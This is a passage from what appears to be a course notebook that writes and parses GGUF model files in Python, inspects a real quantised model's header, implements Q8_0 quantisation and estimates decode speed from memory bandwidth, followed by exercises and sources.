        infos += struct.pack("<I", len(dims))
        infos += b"".join(struct.pack("<Q", d) for d in dims)
        infos += struct.pack("<I", 0)                   # ggml type 0 = f32
        infos += struct.pack("<Q", data_off)

        pad = (-len(raw)) % alignment
        blobs.append(raw + b"\x00" * pad)
        data_off += len(raw) + pad

    header = (GGUF_MAGIC
              + struct.pack("<I", GGUF_VERSION)
              + struct.pack("<Q", len(tensors))
              + struct.pack("<Q", len(kv)))

    body = header + meta + infos
    with open(path, "wb") as f:
        f.write(body)
        f.write(b"\x00" * ((-len(body)) % alignment))   # align the data section
        for b in blobs:
            f.write(b)
    return path


gguf_path = write_gguf(
    WORK / "nulltella.gguf",
    tensors=model.state_dict(),
    kv=[
        ("general.architecture",     VT.STRING,  "nulltella"),
        ("general.name",             VT.STRING,  "ds635_nulltella_linreg"),
        ("general.file_type",        VT.UINT32,  0),              # 0 = all f32
        ("nulltella.context_length", VT.UINT32,  1),
        ("nulltella.block_count",    VT.UINT32,  1),
        ("nulltella.feature_names",  VT.ARRAY,   (VT.STRING, ["hours_of_sunshine"])),
        ("nulltella.training.loss",  VT.FLOAT32, float(loss.item())),
        ("nulltella.training.epochs", VT.UINT32, num_epochs),
    ],
)
print(gguf_path.name, "→", gguf_path.stat().st_size, "bytes")

nulltella.gguf → 608 bytes


In [20]:
blob = gguf_path.read_bytes()
hexdump(blob, n=112, label="the GGUF we just wrote:")
print()
print("offset 0..3   magic          :", blob[0:4])
print("offset 4..7   version        :", struct.unpack('<I', blob[4:8])[0])
print("offset 8..15  tensor_count   :", struct.unpack('<Q', blob[8:16])[0])
print("offset 16..23 kv_count       :", struct.unpack('<Q', blob[16:24])[0])
print("offset 24..31 first key len  :", struct.unpack('<Q', blob[24:32])[0],
      "→", blob[32:32 + struct.unpack('<Q', blob[24:32])[0]].decode())

the GGUF we just wrote:
00000000  47 47 55 46 03 00 00 00 02 00 00 00 00 00 00 00  |GGUF............|
00000010  09 00 00 00 00 00 00 00 14 00 00 00 00 00 00 00  |................|
00000020  67 65 6e 65 72 61 6c 2e 61 72 63 68 69 74 65 63  |general.architec|
00000030  74 75 72 65 08 00 00 00 09 00 00 00 00 00 00 00  |ture............|
00000040  6e 75 6c 6c 74 65 6c 6c 61 0c 00 00 00 00 00 00  |nulltella.......|
00000050  00 67 65 6e 65 72 61 6c 2e 6e 61 6d 65 08 00 00  |.general.name...|
00000060  00 16 00 00 00 00 00 00 00 64 73 36 33 35 5f 6e  |.........ds635_n|

offset 0..3   magic          : b'GGUF'
offset 4..7   version        : 3
offset 8..15  tensor_count   : 2
offset 16..23 kv_count       : 9
offset 24..31 first key len  : 20 → general.architecture


### 9b. The reader

The same walk in reverse. It only touches the header, so it is just as happy pointed at a 17 GB file
as at our 300-byte one — which is exactly what §10 does.

In [21]:
class GGUFReader:
    def __init__(self, path):
        self.path = Path(path)
        self.f = open(path, "rb")

        magic = self.f.read(4)
        if magic != GGUF_MAGIC:
            raise ValueError(f"not a GGUF file (magic = {magic!r})")
        self.version, = struct.unpack("<I", self.f.read(4))
        self.n_tensors, self.n_kv = struct.unpack("<QQ", self.f.read(16))

        self.kv, self.kv_types, self.kv_elem_types = {}, {}, {}
        for _ in range(self.n_kv):
            key = self._read_str()
            vtype, = struct.unpack("<I", self.f.read(4))
            self.kv[key] = self._read_value(vtype, key)
            self.kv_types[key] = vtype

        self.alignment = self.kv.get("general.alignment", GGUF_DEFAULT_ALIGNMENT)

        self.tensors = []
        for _ in range(self.n_tensors):
            name = self._read_str()
            n_dims, = struct.unpack("<I", self.f.read(4))
            dims = struct.unpack(f"<{n_dims}Q", self.f.read(8 * n_dims))
            ttype, = struct.unpack("<I", self.f.read(4))
            offset, = struct.unpack("<Q", self.f.read(8))
            self.tensors.append({"name": name,
                                 "shape": tuple(dims[::-1]),   # ggml order -> torch order
                                 "type": ttype,
                                 "offset": offset})

        pos = self.f.tell()
        self.data_start = pos + (-pos) % self.alignment

    # ---- primitives -------------------------------------------------------
    def _read_str(self):
        n, = struct.unpack("<Q", self.f.read(8))
        return self.f.read(n).decode("utf-8", errors="replace")

    def _read_scalar(self, t):
        if t == VT.STRING:
            return self._read_str()
        fmt = VT_FMT[t]
        return struct.unpack(fmt, self.f.read(struct.calcsize(fmt)))[0]

    def _read_value(self, t, key=None):
        if t == VT.ARRAY:
            elem_type, = struct.unpack("<I", self.f.read(4))
            n, = struct.unpack("<Q", self.f.read(8))
            if key is not None:
                self.kv_elem_types[key] = elem_type
            return [self._read_scalar(elem_type) for _ in range(n)]
        return self._read_scalar(t)

    # ---- tensors ----------------------------------------------------------
    def nbytes(self, info):
        name, blk, sz = GGML_TYPES[info["type"]]
        return math.prod(info["shape"]) // blk * sz

    def read_tensor(self, name):
        info = next(t for t in self.tensors if t["name"] == name)
        tname, _, _ = GGML_TYPES[info["type"]]
        if tname not in ("f32", "f16"):
            raise NotImplementedError(f"dequantising {tname} is llama.cpp's job, not ours")
        self.f.seek(self.data_start + info["offset"])
        raw = self.f.read(self.nbytes(info))
        dt = np.float32 if tname == "f32" else np.float16
        arr = np.frombuffer(raw, dtype=dt).reshape(info["shape"])
        return torch.from_numpy(arr.astype(np.float32).copy())

    def state_dict(self):
        return {t["name"]: self.read_tensor(t["name"]) for t in self.tensors}

    def close(self):
        self.f.close()


def dump_metadata(r, max_items=8, max_kv=None):
    "Reproduce the llama_model_loader banner."
    print(f"gguf_reader: loaded meta data with {r.n_kv} key-value pairs and "
          f"{r.n_tensors} tensors from {r.path.name} (version GGUF V{r.version})")
    for i, (k, v) in enumerate(r.kv.items()):
        if max_kv is not None and i >= max_kv:
            print(f"gguf_reader: - ... {r.n_kv - max_kv} more keys")
            break
        t = r.kv_types[k]
        if t == VT.ARRAY:
            head = ", ".join(repr(x)[:24] for x in v[:3])
            et = VT_NAME.get(r.kv_elem_types.get(k), "?")
            tname = f"arr[{et},{len(v)}]"
            val = f"[{head}{', ...' if len(v) > 3 else ''}]"
        else:
            tname, val = VT_NAME.get(t, "?"), repr(v)
        print(f"gguf_reader: - kv {i:3d}: {k:<40} {tname:<14} = {val[:60]}")

In [22]:
r = GGUFReader(gguf_path)
dump_metadata(r)
print()
print(f"{'tensor':<20}{'shape':<12}{'type':<8}{'offset':>8}{'bytes':>8}")
for t in r.tensors:
    print(f"{t['name']:<20}{str(t['shape']):<12}{GGML_TYPES[t['type']][0]:<8}"
          f"{t['offset']:>8}{r.nbytes(t):>8}")
print(f"\ndata section starts at byte {r.data_start}")

gguf_reader: loaded meta data with 9 key-value pairs and 2 tensors from nulltella.gguf (version GGUF V3)
gguf_reader: - kv   0: general.architecture                     string         = 'nulltella'
gguf_reader: - kv   1: general.name                             string         = 'ds635_nulltella_linreg'
gguf_reader: - kv   2: general.file_type                        uint32         = 0
gguf_reader: - kv   3: nulltella.context_length                 uint32         = 1
gguf_reader: - kv   4: nulltella.block_count                    uint32         = 1
gguf_reader: - kv   5: nulltella.feature_names                  arr[string,1]  = ['hours_of_sunshine']
gguf_reader: - kv   6: nulltella.training.loss                  float32        = 0.08742865920066833
gguf_reader: - kv   7: nulltella.training.epochs                uint32         = 100
gguf_reader: - kv   8: general.alignment                        uint32         = 32

tensor              shape       type      offset   bytes
linear.weight   

In [23]:
# The payoff: reconstruct the model from bytes we parsed ourselves, and run it.
from_gguf = LinearRegression()
from_gguf.load_state_dict(r.state_dict())
r.close()

print("weights recovered from GGUF:", dict(from_gguf.state_dict()))
print(f"prediction for 5.0 hours of sunshine: {from_gguf(test_input).item():.4f} jars")
print("identical to the in-memory model:",
      torch.allclose(from_gguf(test_input), model(test_input)))

weights recovered from GGUF: {'linear.weight': tensor([[1.7551]]), 'linear.bias': tensor([0.7199])}
prediction for 5.0 hours of sunshine: 9.4955 jars
identical to the in-memory model: True


That is the whole idea of the format, at 1/3-billionth of the scale. `llama.cpp` does exactly this —
parse header, read the KV table to learn the architecture, memory-map the tensor data, build the
compute graph — and then, unlike us, actually dequantises `q4_k` blocks on the fly inside the matmul
kernel.

> **💬 Quick check.** We wrote `general.alignment` as the last KV pair, but the reader needs it
> *before* it can compute `data_start`. Why is that safe here, and what would break if alignment were
> stored *after* the tensor infos instead?

## 10. Reading a real model file

Point the parser at any `.gguf` you have. It reads only the header, so file size does not matter.
Set `GGUF_PATH` in your environment, or drop a file next to this notebook.

In [24]:
def find_gguf():
    env = os.environ.get("GGUF_PATH")
    if env and Path(env).exists():
        return Path(env)
    ours = (WORK / "nulltella.gguf").resolve()
    roots = [Path.home() / "models", Path.home() / ".cache" / "huggingface",
             Path.home() / ".cache" / "lm-studio", Path.home() / "Downloads", Path.cwd()]
    for root in roots:
        if not root.exists():
            continue
        try:
            for p in sorted(root.rglob("*.gguf")):
                if p.resolve() != ours:       # skip the toy file we wrote in section 9
                    return p
        except (PermissionError, OSError):
            continue
    return None


real = find_gguf()
if real is None:
    print("No .gguf found. Grab a small one, e.g.:\n")
    print("  huggingface-cli download TheBloke/TinyLlama-1.1B-Chat-v1.0-GGUF \\")
    print("      tinyllama-1.1b-chat-v1.0.Q4_K_M.gguf --local-dir .\n")
    print("or set GGUF_PATH=/path/to/model.gguf and re-run this cell.")
else:
    print("using:", real.name, f"({real.stat().st_size / 1e9:.2f} GB)")

using: Qwen3.6-27B-UD-Q4_K_XL.gguf (17.61 GB)


In [25]:
if real is not None:
    rr = GGUFReader(real)
    dump_metadata(rr, max_kv=26)

gguf_reader: loaded meta data with 51 key-value pairs and 851 tensors from Qwen3.6-27B-UD-Q4_K_XL.gguf (version GGUF V3)
gguf_reader: - kv   0: general.architecture                     string         = 'qwen35'
gguf_reader: - kv   1: general.type                             string         = 'model'
gguf_reader: - kv   2: general.sampling.top_k                   int32          = 20
gguf_reader: - kv   3: general.sampling.top_p                   float32        = 0.949999988079071
gguf_reader: - kv   4: general.sampling.temp                    float32        = 1.0
gguf_reader: - kv   5: general.name                             string         = 'Qwen3.6-27B'
gguf_reader: - kv   6: general.basename                         string         = 'Qwen3.6-27B'
gguf_reader: - kv   7: general.quantized_by                     string         = 'Unsloth'
gguf_reader: - kv   8: general.size_label                       string         = '27B'
gguf_reader: - kv   9: general.license                          

In [26]:
if real is not None:
    from collections import Counter
    by_type = Counter()
    params = Counter()
    bytes_by_type = Counter()
    unknown = 0

    for t in rr.tensors:
        n = math.prod(t["shape"])
        if t["type"] not in GGML_TYPES:
            unknown += 1
            continue
        name = GGML_TYPES[t["type"]][0]
        by_type[name] += 1
        params[name] += n
        bytes_by_type[name] += rr.nbytes(t)

    real_params = sum(params.values())
    real_bytes = sum(bytes_by_type.values())

    print(f"{'type':<9}{'tensors':>8}{'params':>17}{'bytes':>19}{'bpw':>8}")
    for name in sorted(by_type, key=lambda k: -bytes_by_type[k]):
        print(f"{name:<9}{by_type[name]:>8}{params[name]:>17,}"
              f"{bytes_by_type[name]:>19,}{bytes_by_type[name] * 8 / params[name]:>8.2f}")
    if unknown:
        print(f"({unknown} tensors of ggml types not in our table — skipped)")

    print(f"\nmodel params   : {real_params / 1e9:.2f} B")
    print(f"tensor bytes   : {real_bytes / 2**30:.2f} GiB")
    print(f"overall        : {real_bytes * 8 / real_params:.2f} bits per weight")
    print(f"same model fp16: {real_params * 2 / 2**30:.2f} GiB "
          f"({real_params * 2 / real_bytes:.2f}x this file)")
    rr.close()

type      tensors           params              bytes     bpw
q4_k          207   16,397,107,200      9,223,372,800    4.50
q6_k           65    4,946,657,280      4,057,804,800    6.56
q5_k           70    3,056,599,040      2,101,411,840    5.50
q8_0           48    1,509,949,440      1,604,321,280    8.50
iq4_xs         12      959,447,040        509,706,240    4.25
f32           449       26,238,464        104,953,856   32.00

model params   : 26.90 B
tensor bytes   : 16.39 GiB
overall        : 5.24 bits per weight
same model fp16: 50.10 GiB (3.06x this file)


Those last three lines are the `llm_load_print_meta: model size = 7.17 GiB (8.50 BPW)` line from the
log we started with — recomputed from the raw bytes by a parser we wrote in one cell.

Notice the mixed types: real quantised models are **not** uniformly quantised. `llama.cpp` keeps
norms and often the embedding/output matrices at higher precision, because those tensors are small
but error-sensitive, and quantises the big attention/FFN matrices hard. That is what "`Q4_K_M`" means
— a *recipe* over per-tensor type choices, not one number.

## 11. Quantization: the Q8_0 block, and why it buys latency

A GGUF quantised tensor is stored in **blocks**. `Q8_0` is the simplest interesting one:

```c
#define QK8_0 32
typedef struct {
    ggml_fp16_t d;          // scale = max(|x|) / 127
    int8_t      qs[QK8_0];  // 32 quantised weights
} block_q8_0;               // 34 bytes for 32 weights = 8.5 bits per weight
```

That is the whole scheme: per 32 weights, one shared fp16 scale and 32 signed bytes.
Let's implement it and measure what it costs.

In [27]:
QK8_0 = 32

def quantize_q8_0(x):
    x = np.asarray(x, dtype=np.float32).reshape(-1, QK8_0)
    amax = np.abs(x).max(axis=1)
    d = np.where(amax == 0, 1.0, amax / 127.0).astype(np.float16)
    q = np.rint(x / d[:, None].astype(np.float32)).clip(-127, 127).astype(np.int8)
    return q, d


def dequantize_q8_0(q, d):
    return (q.astype(np.float32) * d[:, None].astype(np.float32)).reshape(-1)


# A plausible stand-in for a weight matrix: roughly gaussian, a few outliers.
rng = np.random.default_rng(635)
W = rng.normal(0, 0.02, size=(512, 512)).astype(np.float32)
W.flat[rng.choice(W.size, 200, replace=False)] *= 12      # outliers, as real weights have

q, d = quantize_q8_0(W)
W_hat = dequantize_q8_0(q, d).reshape(W.shape)

err = W_hat - W
print(f"max |error|      : {np.abs(err).max():.3e}")
print(f"rms  error       : {np.sqrt((err ** 2).mean()):.3e}")
print(f"rms  of weights  : {np.sqrt((W ** 2).mean()):.3e}")
print(f"relative rms err : {np.sqrt((err**2).mean()) / np.sqrt((W**2).mean()) * 100:.3f} %")
print(f"cosine similarity: {np.dot(W.ravel(), W_hat.ravel()) / (np.linalg.norm(W) * np.linalg.norm(W_hat)):.8f}")

fp32_bytes = W.nbytes
q80_bytes = q.nbytes + d.nbytes
print(f"\nfp32 : {fp32_bytes:>9,} bytes  (32.00 bpw)")
print(f"q8_0 : {q80_bytes:>9,} bytes  ({q80_bytes * 8 / W.size:.2f} bpw)  "
      f"→ {fp32_bytes / q80_bytes:.2f}x smaller")

max |error|      : 2.714e-03


rms  error       : 1.347e-04
rms  of weights  : 2.104e-02
relative rms err : 0.640 %
cosine similarity: 0.99997938

fp32 : 1,048,576 bytes  (32.00 bpw)
q8_0 :   278,528 bytes  (8.50 bpw)  → 3.76x smaller


### Why a systems course cares

Recall the roofline from Lecture 3/4. Autoregressive **decode** processes one token at a time, so
every weight is read from memory and used for about 2 FLOPs — an arithmetic intensity around
0.25 FLOP/byte, far to the left of any modern machine's ridge point. Decode is **bandwidth-bound**,
so to a first approximation:

$$ t_{\text{token}} \approx \frac{\text{model bytes}}{\text{memory bandwidth}} $$

Quantization does not make the arithmetic faster. It makes the *bytes fewer*. And because we are
memory-bound, tokens/sec scales very nearly **linearly** with the reciprocal of bits-per-weight.

That is a prediction you can make on paper before running anything — which is the point of the lab.

In [28]:
PARAMS = 7.24e9          # mistral-7b
BANDWIDTHS = [("laptop DDR5 (dual channel)", 90e9),
              ("Apple M2 Max (unified)",    400e9),
              ("RTX 4090 (GDDR6X)",        1008e9)]

quants = [("f32", 32.0), ("f16", 16.0), ("q8_0", 8.5), ("q6_k", 6.5625),
          ("q5_k", 5.5), ("q4_k", 4.5), ("q4_0", 4.5), ("iq4_xs", 4.25)]

print(f"{'quant':<8}{'bpw':>7}{'size GiB':>10}", end="")
for bw_name, _ in BANDWIDTHS:
    print(f"{bw_name.split(' (')[0]:>22}", end="")
print()
print(f"{'':<8}{'':>7}{'':>10}" + "".join(f"{'tok/s (roofline)':>22}" for _ in BANDWIDTHS))

for name, bpw in quants:
    nbytes = PARAMS * bpw / 8
    print(f"{name:<8}{bpw:>7.2f}{nbytes / 2**30:>10.2f}", end="")
    for _, bw in BANDWIDTHS:
        print(f"{bw / nbytes:>22.1f}", end="")
    print()

print("\nUpper bounds — no KV cache traffic, no kernel inefficiency, perfect overlap.")
print("Real llama.cpp decode typically lands at 60-80% of these numbers.")
print("The shape of the column, not the absolute value, is what you should predict.")

quant       bpw  size GiB           laptop DDR5          Apple M2 Max              RTX 4090
                               tok/s (roofline)      tok/s (roofline)      tok/s (roofline)
f32       32.00     26.97                   3.1                  13.8                  34.8
f16       16.00     13.49                   6.2                  27.6                  69.6
q8_0       8.50      7.16                  11.7                  52.0                 131.0
q6_k       6.56      5.53                  15.2                  67.4                 169.7
q5_k       5.50      4.64                  18.1                  80.4                 202.5
q4_k       4.50      3.79                  22.1                  98.2                 247.5
q4_0       4.50      3.79                  22.1                  98.2                 247.5
iq4_xs     4.25      3.58                  23.4                 104.0                 262.1

Upper bounds — no KV cache traffic, no kernel inefficiency, perfect overlap.
Re

> **💬 Quick check.** The table says `q4_k` on a laptop should beat `f16` by ~3.5x. Suppose you
> measure only 1.4x. Name two things that could absorb the difference. (Hint: what else moves through
> DRAM per token, and what does a dequantising kernel do that an fp16 kernel does not?)

## 12. Where we ended up

We started with a log full of key-value pairs and walked the whole path:

- a model is **code + a `state_dict`**, and only the second half gets serialized;
- `pickle` serializes by emitting a *program*, which is why it is fast to adopt and unsafe to trust;
- `safetensors` fixes safety and zero-copy reads, but stores only tensors + a flat string map —
  the architecture lives in sibling files;
- **checkpoints** add training state that inference never needs;
- **GGML** put everything in one file for on-edge inference, but froze the hyperparameters into a
  positional list and broke on every change;
- **GGUF** keeps the single-file layout and swaps that list for a **typed key-value table**, which is
  the entire reason it survived;
- and quantization is not a compression trick bolted on the side — for memory-bound decode it *is*
  the performance model.

## Exercises

1. **Extend the writer.** Add `f16` support to `write_gguf` (ggml type `1`) and confirm the file
   halves in size while the reader still reconstructs a working model.

2. **Implement a Q8_0 GGUF.** Write the toy weights as ggml type `8` — 34-byte blocks, fp16 scale
   first — and extend `GGUFReader.read_tensor` to dequantise them. Our model has 2 parameters, so
   you will need to pad to a full 32-element block; explain why that padding rule is why real
   `q4_k` tensors require dimensions divisible by 256.

3. **A wire-compatibility test.** `pip install gguf`, open your file with
   `gguf.GGUFReader`, and check that its KV table matches ours exactly. If it does, your writer is
   spec-conformant. If it does not, the diff tells you which field you got wrong.

4. **Round-trip a real model.** Take a HuggingFace `safetensors` model, convert it with
   `llama.cpp/convert_hf_to_gguf.py`, and diff the KV table against the source `config.json`.
   Which config fields survive, which are renamed, and which are dropped? What does that tell you
   about what an *inference* format considers essential?

5. **Predict, then measure.** Quantize one model to four levels
   (`Q8_0`, `Q6_K`, `Q4_K_M`, `IQ4_XS`). Using §11's table, predict the tok/s ratio between them on
   *your* machine's bandwidth **before running anything**. Then run
   `llama-bench -m model.gguf -p 512 -n 128` and plot size vs perplexity vs tok/s. Reconcile the gap
   — that reconciliation is the actual deliverable.

6. **Where does the error go?** Q8_0 uses one scale per 32 weights. Re-run §11 with block sizes
   8, 32, 128 and 512, and plot relative RMS error against bits-per-weight (remember the scale itself
   costs 16 bits per block). You have just derived, empirically, why k-quants use super-blocks with
   a second level of scales.

## Sources

- Vicki Boykis, [*GGUF, the long way around*](https://vickiboykis.com/2024/02/28/gguf-the-long-way-around/) (2024) — the essay this notebook rebuilds
- [GGUF specification](https://github.com/ggerganov/ggml/blob/master/docs/gguf.md), `ggerganov/ggml`
- [safetensors format](https://github.com/huggingface/safetensors#yet-another-format-), HuggingFace
- [safetensors security audit](https://huggingface.co/blog/safetensors-security-audit), HuggingFace / Trail of Bits / EleutherAI
- Ned Batchelder, [*Pickle's nine flaws*](https://nedbatchelder.com/blog/202006/pickles_nine_flaws.html)
- Nelson Elhage, [*Pickles and ML*](https://blog.nelhage.com/post/pickles-and-ml/)
- PyTorch, [Saving and loading models](https://pytorch.org/tutorials/beginner/saving_loading_models.html)